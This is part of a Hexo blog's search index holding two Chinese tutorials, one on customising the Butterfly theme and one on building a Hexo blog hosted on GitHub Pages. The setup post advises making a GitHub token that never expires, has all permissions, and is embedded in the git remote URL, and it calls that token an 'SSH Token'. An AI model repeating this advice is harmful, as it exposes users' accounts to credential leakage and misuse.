top_img</td></tr></tbody></table></div><p>修改主题配置文件_config.butterfly.yml</p><p>ctrl+f直接搜索index_img</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">index_img:</span> <span class="string">图片链接(例如:</span> <span class="string">https://s1.ax1x.com/2023/04/25/p9uqhKU.jpg)</span></span><br></pre></td></tr></table></figure><p><code>tag_per_img</code> 和 <code>category_per_img</code> 是 3.2.0 新增的内容，可对 tag 和 category 进行单独的配置</p><p>并不推荐为每个 tag 和每个 category 都配置不同的顶部图，因为配置太多会拖慢生成速度</p><h3 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h3><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># footer是否显示图片背景(与 top_img一致)</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="背景图"><a href="#背景图" class="headerlink" title="背景图"></a>背景图</h3><p>打开<strong>主题配置文件</strong>的_config.yml搜索background，修改background后面的链接即可</p><h3 id="注意：链接一定要用url-括起来！！！如果用纯色的话，色号要用单引号括起来，例如：’-add2c2’"><a href="#注意：链接一定要用url-括起来！！！如果用纯色的话，色号要用单引号括起来，例如：’-add2c2’" class="headerlink" title="注意：链接一定要用url()括起来！！！如果用纯色的话，色号要用单引号括起来，例如：’#add2c2’"></a>注意：链接一定要用url()括起来！！！如果用纯色的话，色号要用单引号括起来，例如：’#add2c2’</h3><p><img src="https://s1.ax1x.com/2023/04/25/p9uSCrV.png" alt=""></p><h2 id="打字效果"><a href="#打字效果" class="headerlink" title="打字效果"></a>打字效果</h2><p>修改主题配置文件_config.butterfly.yml，搜索activate-power-mode</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Typewriter Effect (打字效果)</span></span><br><span class="line"><span class="comment"># https://github.com/disjukr/activate-power-mode</span></span><br><span class="line"><span class="attr">activate_power_mode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">colorful:</span> <span class="literal">true</span> <span class="comment"># open particle animation (冒光特效)</span></span><br><span class="line">  <span class="attr">shake:</span> <span class="literal">true</span> <span class="comment">#  open shake (抖動特效)</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h2><p>修改主题配置文件_config.butterfly.yml</p><ol><li><p>烟花，搜索fireworks</p><p>zIndex：-1表示烟火效果在底部；9999表示效果在前面</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fireworks:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">9999</span> <span class="comment"># -1 or 9999</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li><li><p>爱心，搜索click_heart</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 点击出現爱心</span></span><br><span class="line"><span class="attr">click_heart:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li><li><p>搜索ClickShowText</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 点击出现文字，文字可自行修改</span></span><br><span class="line"><span class="attr">ClickShowText:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">text:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">I</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">LOVE</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">YOU</span></span><br><span class="line">  <span class="attr">fontSize:</span> <span class="string">15px</span></span><br><span class="line">  <span class="attr">random:</span> <span class="literal">false</span> <span class="comment"># 文字随机显示</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="打赏"><a href="#打赏" class="headerlink" title="打赏"></a>打赏</h2><p>修改主题配置文件_config.butterfly.yml，搜索reward，注意将照片修改为自己的收款码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sponsor/reward</span></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">QR_code:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">/img/wechat.jpg</span></span><br><span class="line">       <span class="attr">link:</span></span><br><span class="line">       <span class="attr">text:</span> <span class="string">微信</span></span><br><span class="line">     <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">/img/alipay.jpg</span></span><br><span class="line">       <span class="attr">link:</span></span><br><span class="line">       <span class="attr">text:</span> <span class="string">支付宝</span></span><br></pre></td></tr></table></figure><h2 id="修改代码高度"><a href="#修改代码高度" class="headerlink" title="修改代码高度"></a>修改代码高度</h2><p>代码过长默认全部显示影响美观，需要设置高度限制</p><p>打开主题配置文件_config.butterfly.yml，搜索highlight，将false改为300(大概就是显示12行代码，超过12行会被折叠起来)</p><p><img src="https://s1.ax1x.com/2023/05/10/p9DAGbF.png" alt=""></p><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><img src="https://s1.ax1x.com/2023/05/10/p9DAN59.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Github搭建个人博客</title>
      <link href="/post/405e7e90.html"/>
      <url>/post/405e7e90.html</url>
      
        <content type="html"><![CDATA[<p>啊~磕磕绊绊终于搭好了，分享一下我的搭建过程和遇到的问题与解决方案：</p><h3 id="安装并配置Node-js"><a href="#安装并配置Node-js" class="headerlink" title="安装并配置Node.js"></a>安装并配置Node.js</h3><p>注意：</p><ol><li>没有需求千万不要安装cnpm！(参考文章第五步有一个按需安装cnpm)</li><li>cmd全程使用管理员模式打开</li></ol><p>参考文章：<a href="https://blog.csdn.net/weixin_52799373/article/details/123840137">https://blog.csdn.net/weixin_52799373/article/details/123840137</a></p><p>cmd管理员模式下执行下述命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h3 id="安装并配置Git"><a href="#安装并配置Git" class="headerlink" title="安装并配置Git"></a>安装并配置Git</h3><p>这个没什么坑，照着教程做就好</p><p>Git教程：<a href="https://www.cnblogs.com/xueweisuoyong/p/11914045.html">https://www.cnblogs.com/xueweisuoyong/p/11914045.html</a></p><h3 id="创建Github仓库"><a href="#创建Github仓库" class="headerlink" title="创建Github仓库"></a>创建Github仓库</h3><p><img src="https://pic1.zhimg.com/80/v2-010e684d021680e94f0142adc3e014b8_720w.webp" alt=""></p><p>呐，这里一定要注意，仓库名称一定得是你的Github用户名.github.io</p><p>例如：你的Github用户名叫做helloworld，那么仓库名称就应该设置为helloworld.github.io</p><p>另外，访问权限得设置成Public，设成Private不得行！</p><p><img src="https://pic2.zhimg.com/80/v2-d6fa95cce4e455153187135c8ee12359_720w.webp" alt=""></p><h3 id="生成Github-SSH-Token"><a href="#生成Github-SSH-Token" class="headerlink" title="生成Github  SSH  Token"></a>生成Github  SSH  Token</h3><p>注意：生成的Token记得复制并保存下来</p><p><img src="https://xxx.ilovefishc.com/album/202304/22/113125nl1vidmmpo01dmf5.png" alt=""></p><p><img src="https://xxx.ilovefishc.com/album/202304/22/113129xg4oz4bezohzub97.png" alt=""></p><p><img src="https://xxx.ilovefishc.com/album/202304/22/113132ift2tkwxfyedt0y7.png" alt=""></p><p><img src="https://xxx.ilovefishc.com/album/202304/22/113134q8838l6vv776lyv7.png" alt=""></p><p>Expiration是这个Token的使用期限，我偷懒就爱选择No expiration(永不过期)</p><p>权限全勾上就好</p><p><img src="https://xxx.ilovefishc.com/album/202304/22/113136honfjanazvs9ji1y.png" alt=""></p><h3 id="使用SSH-Token"><a href="#使用SSH-Token" class="headerlink" title="使用SSH  Token"></a>使用SSH  Token</h3><ol><li><p>删除远程仓库地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote remove origin</span><br></pre></td></tr></table></figure></li><li><p>检查是否删除成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><p>没有输出证明删除成功</p></li><li><p>链接远程仓库</p><p>注意：不要直接复制，SSH密钥粘贴刚刚保存的Token，用户名和仓库名记得替换成你自己的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://SSH密钥@github.com/用户名/仓库名.git</span><br></pre></td></tr></table></figure><p>完成后再次输入第二步的命令，看到fetch和pull的网址里面出现有生成SSH Token就设置成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure></li></ol><h3 id="生成SSH-Keys"><a href="#生成SSH-Keys" class="headerlink" title="生成SSH  Keys"></a>生成SSH  Keys</h3><p>执行下述命令，提示选择y/n就输入y，没有就一路回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱地址&quot;</span></span><br></pre></td></tr></table></figure><p>找到密钥位置并复制</p><p><img src="https://static001.geekbang.org/infoq/a2/a29aec8d949a8152bad17e1649316bbc.png" alt=""></p><p>测试ssh是否绑定成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果问你yes/no直接yes</p><p><img src="https://static001.geekbang.org/infoq/82/827db6ee904638d62a4f5249fe110bdf.png" alt="img"></p><h3 id="本地访问博客"><a href="#本地访问博客" class="headerlink" title="本地访问博客"></a>本地访问博客</h3><ol><li><p>创建一个Blog文件夹并启用Git Bash Here</p><p><img src="https://static001.geekbang.org/infoq/b0/b06a27bee58606277ea46f413b34ed14.png" alt=""></p></li><li><p>初始化hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>这里折腾了好久，一直显示command not found，重装了好几次node.jx，分析应该是前面安装了cnpm导致hexo的存储位置被改掉了</p><p>解决：前面加一个npx就好了，还是不行的话就自行百度谷歌吧</p><p>这里使用npx hexo … 的话，以后所有hexo命令都需要加上npx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/dd/ddf2ca2f77a32aaff0c8f17b44bbe99b.png" alt=""></p></li><li><p>生成本地的hexo页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/25/259acb6b590338700c8f61ffcc531593.png" alt=""></p></li><li><p>访问</p><p>浏览器输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:4000/</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/5f/5fde531819308103720a5c098f342092.png" alt=""></p></li></ol><p>​        ctrl+c关闭服务器</p><h3 id="上传Blog到Github"><a href="#上传Blog到Github" class="headerlink" title="上传Blog到Github"></a>上传Blog到Github</h3><p>修改-config.yml文件</p><p><img src="https://static001.geekbang.org/infoq/76/76aa4fb226389c10209b17cd97f1b7d8.png" alt=""></p><p>打开该文件并修改内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: 你的github地址</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/eb/eb043db3b67fa17c51096553f05cc055.png" alt=""></p><h3 id="安装hexo-deployer-git-自动部署发布工具"><a href="#安装hexo-deployer-git-自动部署发布工具" class="headerlink" title="安装hexo-deployer-git 自动部署发布工具"></a>安装hexo-deployer-git 自动部署发布工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/a9/a94aa787c8627d7bc2d95fc3aabe211d.png" alt=""></p><p>生成页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/ec/ec4dc5e76906c62036e61f4d083ebaad.png" alt=""></p><p>本地文件上传到Github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>注意：中间会出现登录界面，复制前面生成的SSH Token粘贴进去就好</p><p><img src="https://static001.geekbang.org/infoq/1b/1ba83adbf958f9ed0ad0129bd843f785.png" alt="上传成功"></p><p>注意：网络报错多次尝试就好</p><p><img src="https://static001.geekbang.org/infoq/5e/5e33beb4a80df251722f550b7ca0de88.png" alt=""></p><h3 id="访问Github博客"><a href="#访问Github博客" class="headerlink" title="访问Github博客"></a>访问Github博客</h3><p>浏览器网址输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://用户名.github.io/</span><br></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/infoq/aa/aa2f760148fbcbf6c3ce0b43cbe3433c.png" alt=""></p><p>这一步折腾最久，做好的html网页传到Github后，用户名.github.io打不开，报错404，如图</p><p><img src="https://tse2-mm.cn.bing.net/th/id/OIP-C.Vbx2WxHa_5pDuXsBgAqjPgHaEC?w=319&amp;h=143&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7" alt=""></p><p>解决：一开始试了很多网上的办法，比如点击页面中间的read the full documention然后跟着里面的步骤操作，没有效果，但是检查了很多遍仓库配置都没有问题，后来发现只是workflow一直没有启动，刷新一下仓库配置就可以了</p><ol><li>打开.github.io仓库并点击Setiings</li></ol><p><img src="https://xxx.ilovefishc.com/album/202304/22/171456ke8m5i5wjjhw5qmd.png" alt=""></p><ol><li>点击右侧菜单的Pages并重新选择Source和Branch，我当时配置是对的就没有改，但是保持原来的配置只是重新选择并保存一下可以刷新配置，邮箱就收到workflow启用的邮件了~</li></ol><p><img src="https://xxx.ilovefishc.com/album/202304/22/171450vvfwzk3i3233vssw.png" alt=""></p><h3 id="博客搭建完毕"><a href="#博客搭建完毕" class="headerlink" title="博客搭建完毕~"></a>博客搭建完毕~</h3><p><img src="https://static001.geekbang.org/infoq/0a/0a397f64a129a210ccbebdff832de7af.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
